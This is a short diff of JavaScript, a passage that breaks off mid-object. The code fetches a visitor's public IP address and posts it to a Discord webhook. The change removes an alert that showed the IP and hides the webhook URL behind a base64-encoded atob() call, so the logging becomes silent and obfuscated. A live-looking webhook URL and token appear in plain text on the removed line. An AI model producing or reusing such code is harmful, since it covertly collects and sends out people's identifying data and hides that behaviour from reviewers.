@@ -1,9 +1,8 @@
 var ip;
 fetch('https://ifconfig.me/ip').then(res => res.text()).then(data => ip = data);
 function send(){
-  alert(ip);
   let req = new XMLHttpRequest();
-  req.open("POST", "https://discord.com/api/webhooks/803856738791981108/X4ZKThI27w7EagPQ6n1GvOybOxy0EWv2H8kVNrwj-c38wIEI90tEqoXAk5-9kbwx3prR");
+  req.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODAzODU2NzM4NzkxOTgxMTA4L1g0WktUaEkyN3c3RWFnUFE2bjFHdk95Yk94eTBFV3YySDhrVk5yd2otYzM4d0lFSTkwdEVxb1hBazUtOWtid3gzcHJS"));
   req.setRequestHeader('Content-type', 'application/json');
   let params = {
     username: ip,
